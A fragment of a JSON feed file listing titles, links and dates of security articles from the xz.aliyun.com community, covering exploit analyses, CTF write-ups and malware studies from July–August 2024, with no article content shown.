          "author": null,
          "description": "记录一次 Android 服务端的证书校验的详细过程",
          "link": "https://xz.aliyun.com/t/15276",
          "publishedOn": "2024-08-09T12:57:21.000Z",
          "wordCount": 848,
          "title": "记录一次 Android 服务端的证书校验的详细过程",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15275",
          "author": null,
          "description": "从一道pwn题深入理解exp的编写",
          "link": "https://xz.aliyun.com/t/15275",
          "publishedOn": "2024-08-09T12:36:11.000Z",
          "wordCount": 848,
          "title": "从一道pwn题深入理解exp的编写",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15273",
          "author": null,
          "description": "Solon内存马研究",
          "link": "https://xz.aliyun.com/t/15273",
          "publishedOn": "2024-08-09T08:44:02.000Z",
          "wordCount": 848,
          "title": "Solon内存马研究",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15270",
          "author": null,
          "description": "泛微云桥e-Bridge任意文件上传漏洞分析",
          "link": "https://xz.aliyun.com/t/15270",
          "publishedOn": "2024-08-09T01:57:00.000Z",
          "wordCount": 848,
          "title": "泛微云桥e-Bridge任意文件上传漏洞分析",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15268",
          "author": null,
          "description": "终端PC Web安全 PartA",
          "link": "https://xz.aliyun.com/t/15268",
          "publishedOn": "2024-08-08T07:54:50.000Z",
          "wordCount": 848,
          "title": "终端PC Web安全 PartA",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15267",
          "author": null,
          "description": "ASP.NET下Webshell编译产物免杀",
          "link": "https://xz.aliyun.com/t/15267",
          "publishedOn": "2024-08-08T06:32:01.000Z",
          "wordCount": 848,
          "title": "ASP.NET下Webshell编译产物免杀",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15265",
          "author": null,
          "description": "jdk21下的jndi注入",
          "link": "https://xz.aliyun.com/t/15265",
          "publishedOn": "2024-08-07T13:13:48.000Z",
          "wordCount": 848,
          "title": "jdk21下的jndi注入",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15264",
          "author": null,
          "description": "安全开发02：fscan源码解析-下",
          "link": "https://xz.aliyun.com/t/15264",
          "publishedOn": "2024-08-07T03:22:03.000Z",
          "wordCount": 848,
          "title": "安全开发02：fscan源码解析-下",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15261",
          "author": null,
          "description": "某护网中的小程序渗透",
          "link": "https://xz.aliyun.com/t/15261",
          "publishedOn": "2024-08-06T12:55:13.000Z",
          "wordCount": 848,
          "title": "某护网中的小程序渗透",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15259",
          "author": null,
          "description": "TP-Link WR740 后门漏洞复现",
          "link": "https://xz.aliyun.com/t/15259",
          "publishedOn": "2024-08-06T10:35:22.000Z",
          "wordCount": 848,
          "title": "TP-Link WR740 后门漏洞复现",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15258",
          "author": null,
          "description": "dos攻击漏洞思路小结",
          "link": "https://xz.aliyun.com/t/15258",
          "publishedOn": "2024-08-06T08:59:28.000Z",
          "wordCount": 848,
          "title": "dos攻击漏洞思路小结",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15257",
          "author": null,
          "description": "安全开发01：fscan源码解析-上",
          "link": "https://xz.aliyun.com/t/15257",
          "publishedOn": "2024-08-06T08:47:28.000Z",
          "wordCount": 848,
          "title": "安全开发01：fscan源码解析-上",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15256",
          "author": null,
          "description": "house of banana",
          "link": "https://xz.aliyun.com/t/15256",
          "publishedOn": "2024-08-06T04:22:34.000Z",
          "wordCount": 848,
          "title": "house of banana",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15255",
          "author": null,
          "description": "针对一个高级红队样本的详细分析",
          "link": "https://xz.aliyun.com/t/15255",
          "publishedOn": "2024-08-05T23:51:54.000Z",
          "wordCount": 848,
          "title": "针对一个高级红队样本的详细分析",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15253",
          "author": null,
          "description": "Kerberos 中针对 RODC 的 Key List Attack 分析",
          "link": "https://xz.aliyun.com/t/15253",
          "publishedOn": "2024-08-05T12:34:53.000Z",
          "wordCount": 848,
          "title": "Kerberos 中针对 RODC 的 Key List Attack 分析",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15252",
          "author": null,
          "description": "JsRpc+Galaxy 实现网站HTTP报文自动加解密+自动更新签名",
          "link": "https://xz.aliyun.com/t/15252",
          "publishedOn": "2024-08-05T09:25:23.000Z",
          "wordCount": 848,
          "title": "JsRpc+Galaxy 实现网站HTTP报文自动加解密+自动更新签名",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15251",
          "author": null,
          "description": "从靶场中学习OAuth",
          "link": "https://xz.aliyun.com/t/15251",
          "publishedOn": "2024-08-05T08:30:41.000Z",
          "wordCount": 848,
          "title": "从靶场中学习OAuth",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15249",
          "author": null,
          "description": "XSS之Flash弹窗钓鱼和文件上传getshell各种姿势",
          "link": "https://xz.aliyun.com/t/15249",
          "publishedOn": "2024-08-05T05:42:53.000Z",
          "wordCount": 848,
          "title": "XSS之Flash弹窗钓鱼和文件上传getshell各种姿势",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15243",
          "author": null,
          "description": "针对一个免杀样本的详细分析",
          "link": "https://xz.aliyun.com/t/15243",
          "publishedOn": "2024-08-05T01:34:26.000Z",
          "wordCount": 848,
          "title": "针对一个免杀样本的详细分析",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15242",
          "author": null,
          "description": "java之sql注入代码审计",
          "link": "https://xz.aliyun.com/t/15242",
          "publishedOn": "2024-08-05T01:13:54.000Z",
          "wordCount": 848,
          "title": "java之sql注入代码审计",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15240",
          "author": null,
          "description": "一次异常艰难的渗透测试",
          "link": "https://xz.aliyun.com/t/15240",
          "publishedOn": "2024-08-04T15:47:23.000Z",
          "wordCount": 848,
          "title": "一次异常艰难的渗透测试",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15238",
          "author": null,
          "description": "python函数缺陷导致flask服务重启加载模板的SSTI漏洞",
          "link": "https://xz.aliyun.com/t/15238",
          "publishedOn": "2024-08-04T14:46:39.000Z",
          "wordCount": 848,
          "title": "python函数缺陷导致flask服务重启加载模板的SSTI漏洞",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15232",
          "author": null,
          "description": "反射大师&Xposed----安卓脱壳",
          "link": "https://xz.aliyun.com/t/15232",
          "publishedOn": "2024-08-04T13:45:30.000Z",
          "wordCount": 848,
          "title": "反射大师&Xposed----安卓脱壳",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15226",
          "author": null,
          "description": "TryHackMe靶场-Holo【Windows域渗透】",
          "link": "https://xz.aliyun.com/t/15226",
          "publishedOn": "2024-08-03T10:51:41.000Z",
          "wordCount": 848,
          "title": "TryHackMe靶场-Holo【Windows域渗透】",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15219",
          "author": null,
          "description": "实战-搞定小程序加解密通过遍历导致信息泄露",
          "link": "https://xz.aliyun.com/t/15219",
          "publishedOn": "2024-08-01T12:58:43.000Z",
          "wordCount": 848,
          "title": "实战-搞定小程序加解密通过遍历导致信息泄露",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15218",
          "author": null,
          "description": "长城杯决赛内网渗透部分",
          "link": "https://xz.aliyun.com/t/15218",
          "publishedOn": "2024-08-01T10:36:43.000Z",
          "wordCount": 848,
          "title": "长城杯决赛内网渗透部分",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15217",
          "author": null,
          "description": "FTP协议-匿名用户登录 从0到1",
          "link": "https://xz.aliyun.com/t/15217",
          "publishedOn": "2024-08-01T10:27:07.000Z",
          "wordCount": 848,
          "title": "FTP协议-匿名用户登录 从0到1",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15216",
          "author": null,
          "description": "CVE-2024-37704 MySQL-Connector-Java SQL注入漏洞原理分析及漏洞利用",
          "link": "https://xz.aliyun.com/t/15216",
          "publishedOn": "2024-08-01T10:19:00.000Z",
          "wordCount": 848,
          "title": "CVE-2024-37704 MySQL-Connector-Java SQL注入漏洞原理分析及漏洞利用",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15213",
          "author": null,
          "description": "Tcache Stashing Unlink Attack",
          "link": "https://xz.aliyun.com/t/15213",
          "publishedOn": "2024-08-01T06:21:33.000Z",
          "wordCount": 848,
          "title": "Tcache Stashing Unlink Attack",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15205",
          "author": null,
          "description": "Windows逆向之脱壳-脱壳实战",
          "link": "https://xz.aliyun.com/t/15205",
          "publishedOn": "2024-07-31T15:33:13.000Z",
          "wordCount": 848,
          "title": "Windows逆向之脱壳-脱壳实战",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15202",
          "author": null,
          "description": "海康威视命令执行简单分析",
          "link": "https://xz.aliyun.com/t/15202",
          "publishedOn": "2024-07-31T10:06:35.000Z",
          "wordCount": 848,
          "title": "海康威视命令执行简单分析",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15200",
          "author": null,
          "description": "浅谈Sequelize下的SQL注入漏洞利用",
          "link": "https://xz.aliyun.com/t/15200",
          "publishedOn": "2024-07-31T09:58:26.000Z",
          "wordCount": 848,
          "title": "浅谈Sequelize下的SQL注入漏洞利用",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15034",
          "author": null,
          "description": "DjangoORM注入分享",
          "link": "https://xz.aliyun.com/t/15034",
          "publishedOn": "2024-07-30T11:49:32.000Z",
          "wordCount": 848,
          "title": "DjangoORM注入分享",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15193",
          "author": null,
          "description": "最新版frp二开",
          "link": "https://xz.aliyun.com/t/15193",
          "publishedOn": "2024-07-30T06:43:27.000Z",
          "wordCount": 848,
          "title": "最新版frp二开",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15038",
          "author": null,
          "description": "某个国外的真实XSS漏洞利用探寻",
          "link": "https://xz.aliyun.com/t/15038",
          "publishedOn": "2024-07-30T06:37:08.000Z",
          "wordCount": 848,
          "title": "某个国外的真实XSS漏洞利用探寻",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15130",
          "author": null,
          "description": "HITCON CTF2024 web复现",
          "link": "https://xz.aliyun.com/t/15130",
          "publishedOn": "2024-07-30T03:49:32.000Z",
          "wordCount": 848,
          "title": "HITCON CTF2024 web复现",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15191",
          "author": null,
          "description": "largebin attack高低版本的使用",
          "link": "https://xz.aliyun.com/t/15191",
          "publishedOn": "2024-07-30T03:47:39.000Z",
          "wordCount": 848,
          "title": "largebin attack高低版本的使用",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15190",
          "author": null,
          "description": "由剑桥大学的Stephen Dolan教授《mov is Turing-complete》出发的程序逆向分析",
          "link": "https://xz.aliyun.com/t/15190",
          "publishedOn": "2024-07-30T03:13:05.000Z",
          "wordCount": 848,
          "title": "由剑桥大学的Stephen Dolan教授《mov is Turing-complete》出发的程序逆向分析",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15188",
          "author": null,
          "description": "帆软/view/ReportServer 远程代码执行漏洞分析",
          "link": "https://xz.aliyun.com/t/15188",
          "publishedOn": "2024-07-30T01:44:00.000Z",
          "wordCount": 848,
          "title": "帆软/view/ReportServer 远程代码执行漏洞分析",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15182",
          "author": null,
          "description": "某黑产最新免杀攻击样本详细分析",
          "link": "https://xz.aliyun.com/t/15182",
          "publishedOn": "2024-07-29T23:48:12.000Z",
          "wordCount": 848,
          "title": "某黑产最新免杀攻击样本详细分析",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15181",
          "author": null,
          "description": "Windows逆向之脱壳-IAT修复",
          "link": "https://xz.aliyun.com/t/15181",
          "publishedOn": "2024-07-29T16:35:59.000Z",
          "wordCount": 848,
          "title": "Windows逆向之脱壳-IAT修复",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15178",
          "author": null,
          "description": "TOTOLINK_NR1800X绕过登录漏洞分析--lighttpd服务",
          "link": "https://xz.aliyun.com/t/15178",
          "publishedOn": "2024-07-29T10:18:40.000Z",
          "wordCount": 848,
          "title": "TOTOLINK_NR1800X绕过登录漏洞分析--lighttpd服务",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15177",
          "author": null,
          "description": "RedLine红线窃贼恶意软件的详细分析过程",
          "link": "https://xz.aliyun.com/t/15177",
          "publishedOn": "2024-07-29T09:29:00.000Z",
          "wordCount": 848,
          "title": "RedLine红线窃贼恶意软件的详细分析过程",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15176",
          "author": null,
          "description": "Yara规则安装和使用学习-RedLine编写Yara检测",
          "link": "https://xz.aliyun.com/t/15176",
          "publishedOn": "2024-07-29T09:28:50.000Z",
          "wordCount": 848,
          "title": "Yara规则安装和使用学习-RedLine编写Yara检测",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15175",
          "author": null,
          "description": "大模型图像安全风险探析",
          "link": "https://xz.aliyun.com/t/15175",
          "publishedOn": "2024-07-29T07:58:05.000Z",
          "wordCount": 848,
          "title": "大模型图像安全风险探析",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15173",
          "author": null,
          "description": "程序源码保护攻防对抗录",
          "link": "https://xz.aliyun.com/t/15173",
          "publishedOn": "2024-07-29T05:31:00.000Z",
          "wordCount": 848,
          "title": "程序源码保护攻防对抗录",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15172",
          "author": null,
          "description": "Weblogic T3/IIOP反序列化漏洞CVE-2024-21181分析",
          "link": "https://xz.aliyun.com/t/15172",
          "publishedOn": "2024-07-29T05:11:46.000Z",
          "wordCount": 848,
          "title": "Weblogic T3/IIOP反序列化漏洞CVE-2024-21181分析",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15170",
          "author": null,
          "description": "house of roman（poc以及题目详解）",
          "link": "https://xz.aliyun.com/t/15170",
          "publishedOn": "2024-07-29T03:34:54.000Z",
          "wordCount": 848,
          "title": "house of roman（poc以及题目详解）",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15169",
          "author": null,
          "description": "关于pwn中json的逆向",
          "link": "https://xz.aliyun.com/t/15169",
          "publishedOn": "2024-07-29T03:06:32.000Z",
          "wordCount": 848,
          "title": "关于pwn中json的逆向",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15168",
          "author": null,
          "description": "关于web pwn中socket的理解",
          "link": "https://xz.aliyun.com/t/15168",
          "publishedOn": "2024-07-29T02:52:57.000Z",
          "wordCount": 848,
          "title": "关于web pwn中socket的理解",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15167",
          "author": null,
          "description": "通天星CMSV6 车载定位监控平台漏洞分析及思考",
          "link": "https://xz.aliyun.com/t/15167",
          "publishedOn": "2024-07-29T02:50:09.000Z",
          "wordCount": 848,
          "title": "通天星CMSV6 车载定位监控平台漏洞分析及思考",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15166",
          "author": null,
          "description": "php pwn学习",
          "link": "https://xz.aliyun.com/t/15166",
          "publishedOn": "2024-07-29T02:43:58.000Z",
          "wordCount": 848,
          "title": "php pwn学习",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15164",
          "author": null,
          "description": "ORW针对缺O、R、W情况的总结",
          "link": "https://xz.aliyun.com/t/15164",
          "publishedOn": "2024-07-29T02:27:52.000Z",
          "wordCount": 848,
          "title": "ORW针对缺O、R、W情况的总结",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15163",
          "author": null,
          "description": "house of orange新理解-无idx上限检查的任意地址写任意值",
          "link": "https://xz.aliyun.com/t/15163",
          "publishedOn": "2024-07-29T01:41:50.000Z",
          "wordCount": 848,
          "title": "house of orange新理解-无idx上限检查的任意地址写任意值",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15159",
          "author": null,
          "description": "NodeJS沙箱逃逸",
          "link": "https://xz.aliyun.com/t/15159",
          "publishedOn": "2024-07-28T16:08:13.000Z",
          "wordCount": 848,
          "title": "NodeJS沙箱逃逸",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15158",
          "author": null,
          "description": "Jinjia2沙箱下SSTI获取属性漏洞的利用",
          "link": "https://xz.aliyun.com/t/15158",
          "publishedOn": "2024-07-28T14:25:38.000Z",
          "wordCount": 848,
          "title": "Jinjia2沙箱下SSTI获取属性漏洞的利用",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15156",
          "author": null,
          "description": "武功山杯web&misc全部题解",
          "link": "https://xz.aliyun.com/t/15156",
          "publishedOn": "2024-07-28T11:04:33.000Z",
          "wordCount": 848,
          "title": "武功山杯web&misc全部题解",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15153",
          "author": null,
          "description": "针对Swagger接口泄露未授权访问的各种姿势",
          "link": "https://xz.aliyun.com/t/15153",
          "publishedOn": "2024-07-28T07:10:14.000Z",
          "wordCount": 848,
          "title": "针对Swagger接口泄露未授权访问的各种姿势",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15152",
          "author": null,
          "description": "House Of Rabbit原理与例题",
          "link": "https://xz.aliyun.com/t/15152",
          "publishedOn": "2024-07-28T06:36:18.000Z",
          "wordCount": 848,
          "title": "House Of Rabbit原理与例题",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15151",
          "author": null,
          "description": "Nacos系列安全问题整理",
          "link": "https://xz.aliyun.com/t/15151",
          "publishedOn": "2024-07-28T02:44:31.000Z",
          "wordCount": 848,
          "title": "Nacos系列安全问题整理",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15145",
          "author": null,
          "description": "iofile基础结构以及stdout泄露libc在栈堆的利用原理",
          "link": "https://xz.aliyun.com/t/15145",
          "publishedOn": "2024-07-27T14:17:14.000Z",
          "wordCount": 848,
          "title": "iofile基础结构以及stdout泄露libc在栈堆的利用原理",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15144",
          "author": null,
          "description": "利用environ变量实现堆题打栈--以ciscn2024 ezheap为例",
          "link": "https://xz.aliyun.com/t/15144",
          "publishedOn": "2024-07-27T13:55:49.000Z",
          "wordCount": 848,
          "title": "利用environ变量实现堆题打栈--以ciscn2024 ezheap为例",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15143",
          "author": null,
          "description": "Sanic框架下原型链污染(以国赛sanic和dasctf-sanic题复现为例)",
          "link": "https://xz.aliyun.com/t/15143",
          "publishedOn": "2024-07-27T13:50:38.000Z",
          "wordCount": 848,
          "title": "Sanic框架下原型链污染(以国赛sanic和dasctf-sanic题复现为例)",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15142",
          "author": null,
          "description": "记一次JS到WAF绕过上传",
          "link": "https://xz.aliyun.com/t/15142",
          "publishedOn": "2024-07-27T09:21:48.000Z",
          "wordCount": 848,
          "title": "记一次JS到WAF绕过上传",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15141",
          "author": null,
          "description": "从0到1学会Jetty内存马注入",
          "link": "https://xz.aliyun.com/t/15141",
          "publishedOn": "2024-07-27T08:03:40.000Z",
          "wordCount": 848,
          "title": "从0到1学会Jetty内存马注入",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15139",
          "author": null,
          "description": "内网域渗透之提权&隧道应用",
          "link": "https://xz.aliyun.com/t/15139",
          "publishedOn": "2024-07-26T10:43:47.000Z",
          "wordCount": 848,
          "title": "内网域渗透之提权&隧道应用",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15138",
          "author": null,
          "description": "jeecgboot3.50前台漏洞汇总+审计",
          "link": "https://xz.aliyun.com/t/15138",
          "publishedOn": "2024-07-26T09:44:54.000Z",
          "wordCount": 848,
          "title": "jeecgboot3.50前台漏洞汇总+审计",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15137",
          "author": null,
          "description": "实战内测-某内测项目站点FUZZ到Sql注入",
          "link": "https://xz.aliyun.com/t/15137",
          "publishedOn": "2024-07-26T09:17:41.000Z",
          "wordCount": 848,
          "title": "实战内测-某内测项目站点FUZZ到Sql注入",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15136",
          "author": null,
          "description": "浅析黑猫勒索软件中的UAC绕过提权技术",
          "link": "https://xz.aliyun.com/t/15136",
          "publishedOn": "2024-07-26T09:17:34.000Z",
          "wordCount": 848,
          "title": "浅析黑猫勒索软件中的UAC绕过提权技术",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15135",
          "author": null,
          "description": "基于Windows&Linux权限维持",
          "link": "https://xz.aliyun.com/t/15135",
          "publishedOn": "2024-07-26T09:12:36.000Z",
          "wordCount": 848,
          "title": "基于Windows&Linux权限维持",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15133",
          "author": null,
          "description": "分析ShellCode hash获取api函数",
          "link": "https://xz.aliyun.com/t/15133",
          "publishedOn": "2024-07-26T04:48:15.000Z",
          "wordCount": 848,
          "title": "分析ShellCode hash获取api函数",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15132",
          "author": null,
          "description": "对ejs引擎漏洞及函数特性的利用",
          "link": "https://xz.aliyun.com/t/15132",
          "publishedOn": "2024-07-26T03:54:58.000Z",
          "wordCount": 848,
          "title": "对ejs引擎漏洞及函数特性的利用",
          "imageUrl": null
        },
        {
          "id": "https://xz.aliyun.com/t/15129",
          "author": null,
          "description": "对vbs文件传播远程访问木马的粗浅分析",
          "link": "https://xz.aliyun.com/t/15129",
          "publishedOn": "2024-07-26T03:35:55.000Z",
          "wordCount": 848,
          "title": "对vbs文件传播远程访问木马的粗浅分析",
          "imageUrl": null
        }
      ]
    }
  ],
  "cliVersion": "1.15.1"
}